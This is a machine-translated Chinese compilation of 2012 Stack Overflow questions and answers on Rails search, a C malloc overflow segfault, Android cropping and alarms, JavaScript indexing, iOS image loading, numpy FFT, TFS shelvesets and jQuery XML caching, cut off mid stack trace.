这将使骨干网仅使用 GET/POST 请求，但是它将附加到查询字符串“_method=PUT”或“_method=DELETE”，您可以在服务器端使用它们来检测预期的 HTTP 动词。

因此，在服务器端，您需要像 index.php 文件的第一行那样做这样的事情（在任何框架加载之前）：

```
if (isset($_REQUEST['_method'])) $_SERVER['REQUEST_METHOD'] = $_REQUEST['_method']; 
```

# mysql - Rails 3.2.9 多条件搜索

> ID：13841273
> 
> 赞同：0
> 
> 时间：2012-12-12T13:51:28.413
> 
> 标签：mysql, ruby-on-rails

我需要建立一个具有多个条件的搜索。其中两个主要如下：城市和州以及邮政编码。反过来，我还有其他布尔属性，例如 has_transportation、available_for_work 等。我面临的问题是我想让我的搜索灵活。这意味着，对于布尔属性，用户可以选择 Either。总共有六个布尔属性以及基于 zip 或城市和州的搜索。

在我看来，我正在考虑多个条件语句，但这似乎不是 Rails 方式或完成此搜索的最有效方式。有人可以就如何解决我的问题提供建议吗？

更新：

样本方案

```
t.integer  "zip_code",               :null => false
t.boolean  "availability",           :default => true
t.integer  "travel_distance",        :default => 0
t.boolean  "transportation",         :default => false
t.boolean  "insurance",              :default => false
t.boolean  "tools",                  :default => false
t.boolean  "employee",               :default => false
t.boolean  "subcontractor",          :default => false
t.string   "city"
t.string   "state" 
```

输出：返回的结果将是零个或多个帐户

这是我将要使用的示例：

```
 scope :tools, lambda { |arg| arg.blank? ? where("tools = ? OR tools = ?", true, false) : where(:tools => arg)} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T14:01:06.280

看看**[Ransack](https://github.com/ernie/ransack)**和它的**[演示应用程序](http://ransack-demo.herokuapp.com/users/advanced_search)**。

Ransack 将帮助您构建搜索表单和针对模型运行的查询。

*由于您的问题缺乏很多细节，因此我的回答也必须如此。*

# c - linux下malloc，隐式限制

> ID：13841278
> 
> 赞同：4
> 
> 时间：2012-12-12T13:51:38.303
> 
> 标签：c, linux, malloc

抱歉，如果标题没有应有的描述性，那么问题很难用几句话来形容。我试图通过 malloc'ing 找出我有多少可用内存，如果可行，则写入该段。在某些系统（x86_64 上的所有 linux）上，我在写入第 2049 个 mib 时看到了段错误。代码是：

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/mman.h>

int main (int argc, char **argv) {
    void *addr;
    int megasize = 2100
    /// allocate the memory via mmap same result
    //addr = mmap ((void *) 0, (size_t) megasize << 20, PROT_READ | PROT_WRITE,
    //                                                      MAP_PRIVATE | MAP_ANONYMOUS, (int) -1, (off_t) 0);
    addr = malloc(megasize << 20);
    if (addr == MAP_FAILED) {
            fprintf (stderr, "alloc of %d megabytes failed %s\n", megasize,
            strerror (errno));
            exit (1);
    };
    printf ("got %d megabytes at %p\n", megasize, addr);
    {
            int i;
            char *p = addr;
            printf("touching the %d Mb memory:\n", megasize);
            for (i = 0; i < megasize; i++) {
                    p[i << 20] = 0;
                    putchar('.');
                    if (i%64==63) // commenting out this line i see that it really is the 2049th mb
                            printf(" #%d\n", i);
                    fflush(stdout);
            };
            putchar('\n');
    };
    /// free the memory
    munmap (addr, (size_t) megasize << 20);
    return 0;
} 
```

它在某些系统上可靠地段错误，而在其他系统上则可以正常工作。阅读失败的系统的日志告诉我它不是 oom 杀手。我可以选择一些会导致 malloc 失败的 megasize 值，但这些值更大。对于大于 2gib 且小于 malloc 为这些系统返回 -1 的限制的任何大小，段错误都会可靠地发生。

我相信我正在达到一个限制，这是 malloc 没有观察到的，我无法弄清楚它是什么。我尝试通过 getrlimit 读出一些似乎相关的限制，例如 RLIMIT_AS 和 RLIMIT_DATA 但这些限制要大得多。

这是我的 valgrindlog 的相关部分

```
==29126== Warning: set address range perms: large range [0x39436000, 0xbc836000) (defined)
==29126== Invalid write of size 1
==29126==    at 0x400AAD: main (in /home/max/source/scratch/memorytest)
==29126==  Address 0xffffffffb9436000 is not stack'd, malloc'd or (recently) free'd 
```

任何人都可以给我一个关于问题是什么的线索吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-12T14:15:51.017

通过 计数时会出现溢出`int i`，`int`这里有 4 个字节宽：

```
p[i << 20] = ... 
```

改变

```
int i; 
```

成为

```
size_t i; 
```

`size_t`是寻址内存时的首选类型。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-12T14:39:03.777

32 位`int`无法存储值 2049 mb。您正在通过有符号整数溢出调用未定义的行为，并且碰巧得到一个负数。在大多数 32 位机器上，当添加到一个指针时，该指针会自动回绕并最终为您提供所需的**地址**。在 64 位机器上，这会为您提供一个位于内存块开始**下方**大约 2047 mb 的地址（或环绕到 64 位内存空间的顶部）。

使用正确的类型。在这里，`i`应该有 type `size_t`。

# android - 多点裁剪 Android

> ID：13841283
> 
> 赞同：1
> 
> 时间：2012-12-12T13:51:56.683
> 
> 标签：android, crop

![](../Images/241388e6a1ad8a3a76035e638a44c616.png)

我想在android中实现多点裁剪，如何裁剪路径线内的图像（如图所示的白线）？

**我使用的代码是：**

```
private Bitmap image;

@SuppressLint("NewApi")
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    setContentView(R.layout.activity_main);
    ImageView iv = (ImageView) findViewById(R.id.imageView1);
    image = BitmapFactory.decodeResource(getResources(), R.drawable.splash);
    Bitmap resultingImage = Bitmap.createBitmap(image.getWidth(),
            image.getHeight(), image.getConfig());

    Canvas canvas = new Canvas(resultingImage);
    Paint paint = new Paint();
    paint.setAntiAlias(true);
    paint.setColor(Color.WHITE);
    paint.setStyle(Paint.Style.STROKE);
    paint.setStrokeJoin(Paint.Join.ROUND);
    paint.setStrokeCap(Paint.Cap.ROUND);
    paint.setStrokeWidth(3);
    Path path = new Path();
    path.lineTo(150, 0);
    path.lineTo(210, 120);
    path.lineTo(150, 240);
    path.lineTo(70, 120);
    path.lineTo(150, 0);
    canvas.drawPath(path, paint);
    canvas.drawBitmap(resultingImage, 0, 0, paint);
    iv.setImageBitmap(resultingImage);
} 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T14:05:28.290

这个想法是渲染一个路径并用位图填充它。

有关详细信息，请参阅此链接：[http ://www.41post.com/4794/programming/android-rendering-a-path-with-a-bitmap-fill](http://www.41post.com/4794/programming/android-rendering-a-path-with-a-bitmap-fill)

# php - 如何通过给 INDEX 也给 JSON 赋值

> ID：13841287
> 
> 赞同：1
> 
> 时间：2012-12-12T13:52:05.077
> 
> 标签：php, javascript, jquery, json

如何通过为其提供索引将值分配给 JSON..

看下面的代码，

```
var jsonVariable = [];
jsonVariable[10] = {1:10};
alert(jsonVariable.toSource()); 
```

对于上面的代码，输出是， **`[,,,,,,,,,{1:10}]`** 我期望和我需要的输出是 [10 : {1:10}] 如何编写代码以按照我的预期输出......请帮我简要说明..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T13:56:26.153

您使用了索引运算符 ( `[]`)，它实例化 a`new array`并将索引 10 处的元素设置为`{1: 10}`。您实际上想使用花括号运算符 ( `{}`) 来实例化 a`new object`和广告属性`10: {1:10}`，如下所示：

```
var jsonVariable = {};
jsonVariable[10] = {1:10};
alert(jsonVariable.toSource()); 
```

将成员设置为`array`，您不能简单地跳过一些索引（从 10 开始）。将强制创建所有未连接的索引，直到您的索引。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T13:55:21.497

当您指定一个尚不存在的数组索引时，`[10]`将创建所有以前未填充的索引。就`.push()`开吧。

```
var jsonVariable = [];
// A numeric property should be a string "1", though the browser will probably forgive you
// Just push the new object onto the array
jsonVariable.push({"1":10});
alert(JSON.stringify(jsonVariable));
// [{1:10}] exactly as you describe 
```

如果您需要此特定对象`{1:10}`出现在`jsonVariable[10]`，请将其设为对象`{}`而不是数组。

```
var jsonVariable = {};
jsonVariable["10"] = {"1": 10};
alert(JSON.stringify(jsonVariable));
// {"10":{"1":10}} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T14:03:29.160

我想你需要的是：

```
var jsonVariable = [];
for(var i=0;i<10;i++){
    var temp = {};
    temp[i] = {'Property' : "Data"}
    jsonVariable.push(temp);
}
console.log( JSON.stringify(jsonVariable)); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T14:09:03.947

试试这个：

```
var jsonVariable = []; 
jsonVariable[10] = {1:10};  
function isNotEmpty(element, index, array) {
  return array[index];
};
jsonVariable = jsonVariable.filter(isNotEmpty);

alert(jsonVariable.toSource()); 
```

# iphone - iPhone - 使滚动和其他功能崩溃的图像

> ID：13841289
> 
> 赞同：0
> 
> 时间：2012-12-12T13:52:08.770
> 
> 标签：iphone, objective-c, ios, xcode

每次我在表格视图中加载图像并尝试滚动表格视图时，我的模拟器都会崩溃，但没有显示错误。这可能是因为使用了太多内存。

以下是三个视图中的 1 个的代码：

```
#import "ResultViewController.h"
#import "JobAddSiteViewController.h"
#import "SpecificAddViewController.h"
#import "JobAddSiteAppDelegate.h"
#import "JSONKit.h"

@implementation ResultViewController
@synthesize listData;
@synthesize listLocation;
@synthesize listPostDate;
@synthesize listLogo;
@synthesize listDescription;
@synthesize uiTableView;
@synthesize buttonPrev;
@synthesize buttonNext;

NSInteger *countPage = 1;

NSMutableArray *tempArray;
NSMutableArray *tempArray2;
NSMutableArray *tempArray3;
NSMutableArray *tempArray4;
NSMutableArray *tempArray5;

-(IBAction)done{

JobAddSiteViewController *second = [[JobAddSiteViewController alloc]initWithNibName:nil bundle:nil];
[self presentModalViewController:second animated:YES];
[second release];

}

 -(void)loadData{

NSString *strURL2 = [NSString stringWithFormat:@"http://www.bestitjobs.co.uk/totaljobs.php", ""];
NSData *nsData2 = [NSData dataWithContentsOfURL:[NSURL URLWithString: strURL2]];
NSString *dataResult = [[NSString alloc] initWithData:nsData2 encoding:NSUTF8StringEncoding];

tempArray = [[NSMutableArray alloc] init];
tempArray2 = [[NSMutableArray alloc] init];
tempArray3 = [[NSMutableArray alloc] init];
tempArray4 = [[NSMutableArray alloc] init];
tempArray5 = [[NSMutableArray alloc] init];
NSString *strURL = [NSString stringWithFormat:@"http://www.bestitjobs.co.uk/appresults3.php?pg=%d", countPage];
NSData *nsData = [NSData dataWithContentsOfURL:[NSURL URLWithString: strURL]];

NSDictionary *listDictionary = [nsData objectFromJSONData];
NSArray* people =[listDictionary objectForKey:@"jobs"];
for (NSDictionary *person in people) { 
    NSString *str = [NSString stringWithFormat:@"%@", [person valueForKey:@"position"]];
    NSString *str2 = [NSString stringWithFormat:@"%@", [person valueForKey:@"subcounty"]];
    NSString *str3 = [NSString stringWithFormat:@"%@", [person valueForKey:@"postdate"]];
    NSString *str4 = [NSString stringWithFormat:@"%@", [person valueForKey:@"logo"]];
    NSString *str5 = [NSString stringWithFormat:@"%@", [person valueForKey:@"description"]];

    if(![str isEqualToString:@"<null>"])
    { 
        NSString *position = [person objectForKey:@"position"];
        [tempArray addObject: position];

        if(![str2 isEqualToString:@"<null>"])
        { 
            NSString *subcounty = [person objectForKey:@"subcounty"];
            [tempArray2 addObject: subcounty];
        }
        else{
            [tempArray2 addObject: @"-"];
        }

        if(![str3 isEqualToString:@"<null>"])
        { 
            NSString *postDate = [person objectForKey:@"postdate"];
            [tempArray3 addObject: postDate];
        }
        else{
            [tempArray3 addObject: @"-"];
        }

        if(![str4 isEqualToString:@"<null>"])
        { 
            NSString *logo = [person objectForKey:@"logo"];
            [tempArray4 addObject: [NSString stringWithFormat:@"http://www.bestitjobs.co.uk/employers/logo/Files/%@", logo]];
        }
        else{
            [tempArray4 addObject: [NSString stringWithFormat:@"http://www.bestitjobs.co.uk/employers/logo/Files/%@", "noimage.gif"]];
        }

        if(![str5 isEqualToString:@"<null>"])
        { 
            NSString *description = [person objectForKey:@"description"];
            [tempArray5 addObject: description];
        }
        else{
            [tempArray5 addObject: @"-"];
        }
    }

}

if (countPage == 1) {
    [self.buttonPrev setEnabled:FALSE];

}
else {

    [self.buttonPrev setEnabled:TRUE];
}

NSInteger val = [dataResult intValue];
NSInteger pageEnd = val/10;

if (countPage < pageEnd) {
    [self.buttonNext setEnabled:TRUE];

}
else {
    [self.buttonNext setEnabled:FALSE];
}

//NSMutableArray *array = [[NSMutableArray alloc] initWithObjects:@"iPhone", @"iPod",@"iPad",nil];

self.listData = tempArray;
self.listLocation = tempArray2;
self.listPostDate = tempArray3;
self.listLogo = tempArray4;
self.listDescription = tempArray5;

[self.listData release];
[self.listLocation release];
[self.listPostDate release];
[self.listLogo release];
[self.listDescription release];

tempArray = nil;
tempArray2 = nil;
tempArray3 = nil;
tempArray4 = nil;
tempArray5 = nil;

} 

- (void)viewDidLoad {

[self loadData];
[super viewDidLoad];

}

- (void)dealloc {

[tempArray dealloc];
[tempArray2 dealloc];
[tempArray3 dealloc];
[tempArray4 dealloc];
[tempArray5 dealloc];

[self.listData dealloc];
[self.listLocation dealloc];
[self.listPostDate dealloc];
[self.listLogo dealloc];
[self.listDescription dealloc];
[super dealloc];
}

#pragma mark -
#pragma mark Table View Data Source Methods

- (IBAction)prev{

countPage = countPage - 1;

[self.listData removeAllObjects];
[self.listLocation removeAllObjects];
[self.listPostDate removeAllObjects];
[self.listLogo removeAllObjects];

//NSMutableArray *array = [[NSMutableArray alloc] initWithObjects:@"1", @"2",@"3",nil];

//self.listData = array;
[self loadData];

[self.uiTableView reloadData];
}

- (IBAction)next{

countPage = countPage + 1;

[self.listData removeAllObjects];
[self.listLocation removeAllObjects];
[self.listPostDate removeAllObjects];
[self.listLogo removeAllObjects];

//NSMutableArray *array = [[NSMutableArray alloc] initWithObjects:@"1", @"2",@"3",nil];

//self.listData = array;
[self loadData];

[self.uiTableView reloadData];

} 

- (void)tableView:(UITableView*)tableView didSelectRowAtIndexPath:(NSIndexPath*)indexPath {

JobAddSiteAppDelegate *ja = (JobAddSiteAppDelegate *)[[UIApplication sharedApplication] delegate];
UITableViewCell *cell = [tableView cellForRowAtIndexPath:indexPath];

for (UIView *view in  cell.contentView.subviews){                

    if ([view isKindOfClass:[UILabel class]]){

        UILabel *label = (UILabel *)view;

        if (label.tag == 1) {

            ja.jobText = label.text;
        }
        if (label.tag == 2) {

            ja.locationText = label.text;
        }
        if (label.tag == 3) {

            ja.dateText = label.text;
        }
        if (label.tag == 4) {

        }
        if (label.tag == 5) {

            ja.specificText = label.text;
        }

    }
    if ([view isKindOfClass:[UIImageView class]]){

        UIImageView *image = (UIImageView *)view;

        if (image.tag = 4){

            ja.logoText = image.image;

        }

    }
}

SpecificAddViewController *second = [[SpecificAddViewController alloc]initWithNibName:nil bundle:nil];
[self presentModalViewController:second animated:YES];
[second release];

}

- (NSInteger)tableView:(UITableView *)tableView
numberOfRowsInSection:(NSInteger)section
{
return [self.listData count];
}

- (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath       
*)indexPath
{
if (indexPath.section == 1 && indexPath.row == 1) {
    return 65;
}
return 65;
}

- (UITableViewCell *)tableView:(UITableView *)tableView
     cellForRowAtIndexPath:(NSIndexPath *)indexPath
{

static NSString *SimpleTableIdentifier = @"SimpleTableIdentifier";
UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:SimpleTableIdentifier];

UILabel *labelMain;
UILabel *labelLocation;
UILabel *labelDate;
UIImageView *image;
UILabel *ref;

if (cell == nil) {
    cell = [[[UITableViewCell alloc]initWithStyle:UITableViewCellStyleDefault reuseIdentifier:SimpleTableIdentifier] autorelease];

    image = [[[UIImageView alloc] initWithFrame:CGRectMake(0,3,80,62)] autorelease];
    image.tag = 4;
    [cell.contentView addSubview:image];

    labelMain = [[[UILabel alloc] initWithFrame:CGRectMake(90,3,200,20)] autorelease];
    labelMain.tag = 1;
    labelMain.font = [UIFont systemFontOfSize:14.0];
    [cell.contentView addSubview:labelMain];

    labelLocation = [[[UILabel alloc] initWithFrame:CGRectMake(90,20,200,20)] autorelease];
    labelLocation.tag = 2;
    labelLocation.font = [UIFont systemFontOfSize:12.0];
    labelLocation.textColor = [UIColor darkGrayColor];
    [cell.contentView addSubview:labelLocation];

    labelDate = [[[UILabel alloc] initWithFrame:CGRectMake(90,40,200,20)] autorelease];
    labelDate.tag = 3;
    labelDate.font = [UIFont systemFontOfSize:12.0];
    labelDate.textColor = [UIColor darkGrayColor];
    [cell.contentView addSubview:labelDate];

    ref = [[[UILabel alloc] initWithFrame:CGRectMake(0, 0, 0, 0)] autorelease];
    ref.tag = 5;
    [cell.contentView addSubview:ref];
} 

[(UILabel *)[cell.contentView viewWithTag:1] setText:[self.listData objectAtIndex:indexPath.row]];
[(UILabel *)[cell.contentView viewWithTag:2] setText:[self.listLocation objectAtIndex:indexPath.row]];
[(UILabel *)[cell.contentView viewWithTag:3] setText:[self.listPostDate objectAtIndex:indexPath.row]];
[(UILabel *)[cell.contentView viewWithTag:5] setText:[self.listDescription objectAtIndex:indexPath.row]];
NSString *imagePath = [self.listLogo objectAtIndex:indexPath.row];
image.image = [UIImage imageWithData:[NSData dataWithContentsOfURL:[NSURL URLWithString:imagePath]]];

return cell;

}

@end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T15:11:09.670

通话

`image.image = [UIImage imageWithData:[NSData dataWithContentsOfURL:[NSURL URLWithString:imagePath]]];`

将阻塞执行线程并且在网络使用方面不确定地长这是一件坏事。您的每个单元格都需要等待图像加载。

查看“延迟加载 tableView 单元格”作为研究主题。

相反，您应该提供单元格的 URL，并告诉它从主线程加载图像。

如在

`[cell loadImageAtURL:someURL];`

在 UITableViewCell 子类实现中

```
-(void)loadImageAtURL:(NSURL *)aurl
{
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{

        NSData *data = [NSData dataWithContentsOfURL:aurl];
        if (data) {
            UIImage *image = [UIImage imageWithData:data];

            //must update UI on main queue
            dispatch_async(dispatch_get_main_queue()  ,^{
                self.cellImageView = image;
            }
        }
    });

} 
```

还有大量的 Obj-C 图像加载器。[EGOCache](https://github.com/enormego/EGOCache)是我去图书馆，但看看周围。

总之，单元格需要拥有图像加载过程而不是表格视图，因为不能保证在图像加载和显示之前单元格不会被重用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T14:08:24.877

NSInteger 是原始类型，这意味着它可以本地存储在堆栈上。您不需要使用指针来访问它。我认为您使用它的方式是一个问题，获取指针值而不是原始类型的实际值。

我认为这就是您想要声明/初始化 countPage 的内容：

```
NSInteger countPage = 1; 
```

# python - 当 N 不是 2 的幂时 Numpy (Python) 中的 FFT

> ID：13841296
> 
> 赞同：4
> 
> 时间：2012-12-12T13:52:20.583
> 
> 标签：python, numpy, fft

我的问题是关于 Numpy 的 FFT 函数中使用的算法。

Numpy 的文档说它使用 Cooley-Tukey 算法。但是，您可能知道，该算法仅在点数 N 是 2 的幂时才有效。

numpy 是否填充我的输入向量 x[n] 以计算其 FFT X[k]？（我不这么认为，因为我在输出中的点数也是 N）。我如何才能真正“看到” numpy 用于其 FFT 功能的代码？

干杯!

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-12T14:57:42.207

文档说 numpy 的 FFT 基于[FFTPACK](http://www.netlib.org/fftpack/)。

在 FFTPACK 文档中，我发现以下内容：

> * * *
> 
> 子程序 rffti(n,wsave)
> 
> * * *
> 
> 子程序 rffti 初始化用于 rfftf 和 rfftb 的数组 wsave。计算 n 的素数分解以及三角函数列表并将其存储在 wsave 中。

标准的 Cooley-Tukey 算法是“radix-2 with decimation in time”，它递归地将一个大小为 n 的 FFT 的计算减少为 2 个大小`2*n`为 n 的 FFT，加上 n 个大小为 2 的 FFT。有一个相同的通用分解版本该算法将大小的 FFT 转换为大小`m*n`为 m 的 n 个 FFT 加上大小为 n 的 m 个 FFT。FFTPACK 中的准备例程计算输入大小的素因数分解这一事实似乎表明这就是他们正在做的事情。因此，除非您选择素数的元素，或者您的元素数具有非常大的素数，否则您仍然应该获得相当不错的加速。

几年前，我在博客上写过 Cooley-Tukey 算法的[radix-2](http://numericalrecipes.wordpress.com/2009/04/30/the-radix-2-cooley-tukey-fft-algorithm-with-decimation-in-time/)和[一般因式分解](http://numericalrecipes.wordpress.com/2009/05/29/the-cooley-tukey-fft-algorithm-for-general-factorizations/)版本。阅读这些内容可能有助于理解 NumPy 内部发生的事情。下图是从那里拍摄的，描绘了 CT FFT：

![在此处输入图像描述](../Images/5d5f0282868187cce94b3faffb24c980.png)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-10-12T02:52:34.407

根据我的经验，算法不会自动填充，或者至少其中一些不会。例如，对长度不长 == 2 的幂的信号运行 scipy.signal.hilbert 方法大约需要 45 秒。当我自己用零填充信号到这样的长度时，花了 100 毫秒。

YMMV，但基本上每次运行信号处理算法时都需要仔细检查。

# tfs - 尽快通过 Visual Studio 查找搁置集

> ID：13841302
> 
> 赞同：13
> 
> 时间：2012-12-12T13:52:29.450
> 
> 标签：tfs, visual-studio-2012

我每天都需要使用 Visual Studio 查看许多搁置集。我已将`TfsPendingChanges`命令添加到我的工具栏，但访问搁置集（操作/查找搁置集）的其余过程仍然感觉笨拙。事实上，搁置审查与我自己的未决更改无关。VS11 只是让它比以前长了一步。

有没有办法在 Visual Studio 2012 中以某种形式将“查找货架集”直接添加到菜单或工具栏？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-12-12T15:25:32.540

如果你在任何工具栏上右击然后“自定义”，它会弹出一个对话框。按其上的“键盘”按钮，选择 File.TfsUnShelvePendingChanges 并为其分配一个热键。我确实相信源代码管理资源管理器窗口需要打开并处于活动状态，您的热键才能工作。

或者...这可能不是您要查找的内容，但如果您打开并激活了源代码管理资源管理器窗口，`ALT-F` `ALT-R` `ALT-F` `ALT-F` `ALT-S`则会弹出对话框。这实际上是在导航文件/源代码管理/查找/查找货架集。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-13T10:18:46.293

使用 Shelvesets 最简单的方法是使用新的“我的工作”功能。通过暂停和恢复工作，Visual Studio 将自动为您完成所有 Shelveset 魔术，只需拖放您想要进行的任务即可。

这同样适用于审查，暂停您当前的工作，或创建一个新的临时工作区，打开审查请求，让它自动取消搁置更改，完成后通过恢复以前的任务回到原来的位置。

一旦你掌握了它，它真的很棒。很高兴知道它在引擎盖下使用了 Shelvesets，但是这样你就不需要知道了，它就可以工作。

至于 TWA Diff，[TFS 2012 Update 2 已经有了很大的改进，](http://blogs.msdn.com/b/bharry/archive/2013/01/30/announcing-visual-studio-2012-update-2-vs2012-2.aspx)几乎可以发布了……

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T14:58:03.270

如果这仅用于评论，那么 Team Web Access 可能更适合您？只需导航到 http://:8080/tfs/web/，选择团队项目，然后单击 Source Tab 和 Find Shelvesets。然后，您可以在新的浏览器窗口中打开每个搁置集，它会列出所有更改并允许您快速进行比较等。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-04-25T06:42:12.587

您正在寻找的命令是**File**下的**TfsUnshelvePendingChanges**。

 **右键单击任何工具栏，单击自定义，将打开一个对话框。转到顶部的“命令”选项卡。

从菜单栏中选择适当的按钮 | 工具栏 | 上下文菜单。在其下选择所需的选项。我最喜欢的是将它添加到 Toolbar>Work Item Tracing（出现 New Item/Open Item 的工具栏）。

[![自定义对话框](../Images/06f9cb0db76ddbfe3f211b97302d6f47.png)](https://i.stack.imgur.com/FuW7J.jpg)

从恰当地从上面选择后，单击“新命令”。然后选择文件>TfsUnShelvePendingChanges。这将添加一个取消搁置更改的快捷方式。

[![选择命令](../Images/d0d6f85c8a1f4c0b2e338ee277fdb2b3.png)](https://i.stack.imgur.com/cToLF.jpg)

感谢@Alex 指出正确的命令名称。单独写在这里，供将来寻找答案的人使用。**

# jquery - 修改 XML 后用 jQuery 读取 XML 文件

> ID：13841310
> 
> 赞同：0
> 
> 时间：2012-12-12T13:53:05.663
> 
> 标签：jquery, html, xml

我有一个很好的 jquery 代码来读取我的 XML 文件。唯一的问题是，如果我更改 XML 文件，我的 html 会以某种方式显示 XML 中的旧值。我首先用 JAvascript 尝试了这个，现在 Jquery 也发生了同样的事情。

这是我的 HTML 代码：

```
<body>
<div id="recentNews">
    <h2>Recent News</h2>
</div>
</body> 
```

这是我的脚本：

```
<script type="text/javascript">
        $(document).ready(function () {
            $.get('News/news.xml', function (d) {
                $('body').find('#recentNews').append('<h1> Here are the news: </h1><dl />');
                $(d).find('news').each(function () {
                    var $news = $(this);
                    var nText = $news.find('newsText').text();
                    var nImage = $news.find('newsImage').text();

                    var html = '<dt> <img class="bookImage" alt="" src="News/' + nImage + '" /> </dt>';
                    html += '<dd> <span class="loadingPic" alt="Loading" />';
                    html += '<p> ' + nText + '</p>';
                    html += '</dd>';

                    $('dl').append($(html));

                    $('.loadingPic').fadeOut(1400);
                });
            });
        });
    </script> 
```

这是我的 news.XML 文件：

```
<?xml version="1.0" encoding="utf-8" ?>
<recentNews>
  <news>
    <newsText>
      <![CDATA[Grand OPening!]]>
    </newsText>
    <newsImage>
      <![CDATA[opening.jpg]]>
    </newsImage>
  </news>

  <news>
    <newsText>
      <![CDATA[Merry Christmas!]]>
    </newsText>
    <newsImage>
      <![CDATA[christmas.png]]>
    </newsImage>
  </news>

</recentNews> 
```

如果我将 newsText 从 Merry Christmas 更改为 Happy Holidays，它仍然会以某种方式记住并显示 Merry Christmas...

知道为什么会这样吗？Javascipt 也是如此

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T19:26:27.537

IE9 有一种奇怪的清除缓存的方法。但这似乎是问题所在

# android - 定期执行警报（自动启动）

> ID：13841313
> 
> 赞同：1
> 
> 时间：2012-12-12T13:53:14.680
> 
> 标签：android, alarmmanager

我研究了警报管理器和我自己的应用程序的自动启动。我想要一个不可见的服务（名称不正确，抱歉），它会定期向我展示敬酒（用于测试目的）。

以下代码运行但不正确。我点击“按钮”，活动消失但什么都没有......

我的代码：

```
MainActivity

public class MainActivity extends Activity {

/** Called when the activity is first created. */
  @Override
  public void onCreate(Bundle savedInstanceState) {
      super.onCreate(savedInstanceState);
      setContentView(R.layout.activity_main);
      Button buttonStart = (Button)findViewById(R.id.button1);
      buttonStart.setOnClickListener(new Button.OnClickListener(){

  @Override
  public void onClick(View arg0) {
    Intent myIntent = new Intent(getBaseContext(),
      MyScheduledReceiver.class);

    PendingIntent pendingIntent
     = PendingIntent.getBroadcast(getBaseContext(),
       0, myIntent, 0);

    AlarmManager alarmManager
      = (AlarmManager)getSystemService(ALARM_SERVICE);
    Calendar calendar = Calendar.getInstance();
    calendar.setTimeInMillis(System.currentTimeMillis());
    calendar.add(Calendar.SECOND, 10);
    long interval = 60 * 10; //
    alarmManager.setRepeating(AlarmManager.RTC_WAKEUP,
      calendar.getTimeInMillis(), interval, pendingIntent);
    finish();
  }});
  }

}

AutoStartNotifyReceiver

public class AutoStartNotifyReceiver extends BroadcastReceiver {
    private final String BOOT_COMPLETED_ACTION =   "android.intent.action.BOOT_COMPLETED";
    public void onReceive(Context context, Intent intent) {
        if(intent.getAction().equals(BOOT_COMPLETED_ACTION)){

             Intent myIntent = new Intent(context, MyScheduledReceiver.class);
             PendingIntent pendingIntent = PendingIntent.getBroadcast(context,  0,     myIntent, 0);

             AlarmManager alarmManager =         (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
             Calendar calendar = Calendar.getInstance();
             calendar.setTimeInMillis(System.currentTimeMillis());
             calendar.add(Calendar.SECOND, 10);
             long interval = 60 * 10;
             alarmManager.setRepeating(AlarmManager.RTC_WAKEUP,         calendar.getTimeInMillis(), interval, pendingIntent);           
        }
    }
}

MyScheduledActivity

public class MyScheduledActivity extends Activity {

MediaPlayer player;

@Override
public void onCreate(Bundle savedInstanceState){ 
  super.onCreate(savedInstanceState);
  //Toast.makeText(getApplicationContext(), "Eseguo onCreate",     Toast.LENGTH_LONG).show();
  setContentView(R.layout.activity_main);

  player = MediaPlayer.create(this, R.raw.gabriel);
  player.start();

    Toast.makeText(this, "miao",Toast.LENGTH_LONG).show();

}

 }

 MyScheduledReceiver

 public class MyScheduledReceiver extends BroadcastReceiver {

 public void onReceive(Context context, Intent intent) {

 Intent scheduledIntent = new Intent(context, MyScheduledActivity.class);
 scheduledIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 context.startActivity(scheduledIntent);
 }
 } 
```

显现：

```
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
<receiver android:name=".AutoStartNotifyReceiver">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
    </intent-filter>
</receiver> 
```

{12-12 14:50:21.411: E/AndroidRuntime(865): FATAL EXCEPTION: main 12-12 14:50:21.411: E/AndroidRuntime(865): java.lang.RuntimeException: Unable to start activity ComponentInfo{com .example.servi/com.example.servi.M​​yScheduledActivity}：java.lang.NullPointerException 12-12 14:50:21.411：E/AndroidRuntime(865)：在 android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1956) 12-12 14:50:21.411: E/AndroidRuntime(865): 在 android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1981) 12-12 14:50:21.411: E/AndroidRuntime(865): 在 android. app.ActivityThread.access$600(ActivityThread.java:123) 12-12 14:50:21.411: E/AndroidRuntime(865): 在 android.app.ActivityThread$H.handleMessage(ActivityThread.java:1147) 12-12 14 :50:21.411: E/AndroidRuntime(865): 在 android.os.Handler.dispatchMessage(Handler.java:99) 12-12 14:50:21.411:E/AndroidRuntime(865): 在 android.os.Looper.loop(Looper.java:137) 12-12 14:50:21.411: E/AndroidRuntime(865): 在 android.app.ActivityThread.main(ActivityThread.java :4424) 12-12 14:50:21.411: E/AndroidRuntime(865): 在 java.lang.reflect.Method.invokeNative(Native Method) 12-12 